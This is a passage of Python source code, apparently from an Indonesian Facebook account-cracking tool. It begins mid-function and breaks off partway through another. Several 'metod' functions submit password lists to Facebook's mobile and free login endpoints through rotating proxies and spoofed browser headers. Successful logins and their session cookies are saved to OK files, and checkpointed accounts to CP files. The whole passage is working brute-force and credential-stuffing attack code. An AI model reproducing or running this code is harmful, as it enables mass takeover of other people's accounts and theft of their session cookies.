        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'XMLHttpRequest',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
      }
      po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=header,allow_redirects=False)
      if "checkpoint" in po.cookies.get_dict().keys():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "c_user" in ses.cookies.get_dict().keys():
        if 'no' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# Method free validate
def metodV3(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  ses = requests.Session()
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des)
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks5://'+nip}
      ses.headers.update({
        'Host': 'free.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua-mobile': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
      })
      p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
      data={
        "lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
        "jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
        "uid":idf,
        "next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr",
        "flow":"login_no_pin",
        "pass":pw,
      }
      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      header={
        'Host': 'free.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://free.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'XMLHttpRequest',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7',
        'connection': 'close',
      }
      po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={'cookie': koki},headers=header,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "c_user" in ses.cookies.get_dict().keys():
        if 'no' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# Method m async
def metodV4(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  ses = requests.Session()
  prog.advance(des) 
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks5://'+nip}
      link = ses.get("https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
      data={
        "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
        "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
        "try_number": "0",
        "unrecognized_tries": "0",
        "email": idf,
        "prefill_contact_point": f"{idf} {pw}",
        "prefill_source": "browser_dropdown",
        "prefill_type": "password",
        "first_prefill_source": "browser_dropdown",
        "first_prefill_type": "contact_point",
        "had_cp_prefilled": True,
        "had_password_prefilled": True,
        "is_smart_lock": False,
        "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
        "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
        "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pw}",
        "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
        "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
      }
      head={
        "Host": "m.facebook.com",
        "content-length": f"{str(len(data))}",
        "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded", 
        "accept": "*/*",
        "origin": "https://m.facebook.com",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
        "accept-encoding": "gzip, deflate",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
      }
      po = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "c_user" in ses.cookies.get_dict().keys():
        if 'no' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# Method m reguler
def metodV5(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  ses = requests.Session()
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des) 
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks5://'+nip}
      link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
      data={
        'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
        'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
        'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
        'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
        'try_number': 0,
        'unrecognized_tries': 0,
        'email':idf,
        'pass':pw,
        'login':'Masuk',
        'prefill_contact_point': '',
        'prefill_source': '',
        'prefill_type': '',
        'first_prefill_source': '',
        'first_prefill_type': '',
        'had_cp_prefilled': False,
        'had_password_prefilled': False,
        'is_smart_lock': False,
        'bi_xrwh': 0
      }
      head={
        'Host': 'm.facebook.com','x-fb-rlafr': '0',
        'access-control-allow-origin': '*',
        'facebook-api-version': 'v12.0',
        'strict-transport-security': 'max-age=15552000; preload',
        'pragma': 'no-cache',
        'cache-control': 'private, no-cache, no-store, must-revalidate',
        'x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof',
        'x-fb-trace-id': 'Cx4jrkJJire',
        'x-fb-rev': '1007127514',
        'x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==',
        'content-length': '2141',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'save-data': 'on',
        'upgrade-insecure-requests': '1',
        'origin': 'https://m.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'
      }
      links = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
      po = ses.post(links,data=data,headers=head,allow_redirects=False)
      if "checkpoint" in po.cookies.get_dict().keys():
        if 'no' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'ya' in cekpoNdyzIn:
          cp+=1
          print('\n')
          statuscp = f'{k}[•] ID|PASSWORD : {idf}|{pw}\n[•] USERAGENT   : {ua}'
          print(statuscp)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'\n')
          akun.append(idf+'|'+pw)
          ceker(idf,pw)
          break
      elif "c_user" in ses.cookies.get_dict().keys():
        if 'no' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          break
        elif 'ya' in appNdyZ:
          ok+=1
          coki=po.cookies.get_dict()
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
          print('\n')
          statusok = f'{u}[•] ID|PASSWORD : {idf}|{pw}\n[•] COKI        : {kuki}'
          print(statusok)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          cek_apk(kuki)
          break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(31)
  loop+=1

# Method free reguler
def metodV6(idf,pwv):
  global loop,ok,cp
  ua = random.choice(ugen)
  ses = requests.Session()
  prog.update(des,description=f"[bold purple]Sabar Sayang[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des) 
  for pw in pwv:
    try:
      if 'ya' in ualuh: ua = ualu[0]
      nip=random.choice(prox)
      proxs= {'http': 'socks5://'+nip}
      ses.headers.update({
        "Host":"free.facebook.com",
        "upgrade-insecure-requests":"1",
        "user-agent":ua,
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "dnt":"1",
        "x-requested-with":"mark.via.gp",
        "sec-fetch-site":"same-origin",
        "sec-fetch-mode":"cors",
        "sec-fetch-user":"empty",
        "sec-fetch-dest":"document",
        "referer":"https://free.facebook.com/",
        "accept-encoding":"gzip, deflate br",
        "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
      })
      p = ses.get('https://free.facebook.com/login/?email='+idf).text
      data={
        'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
        'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
        'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
        'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
        'email':idf,
        'pass':pw,
      }
      ses.headers.update({
        'Host': 'free.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': 'https://free.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-user': 'empty',
        'sec-fetch-dest': 'document',
        'referer': 'https://free.facebook.com/login/?email='+idf,
        'accept-encoding':'gzip, deflate br',
        'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'
      })
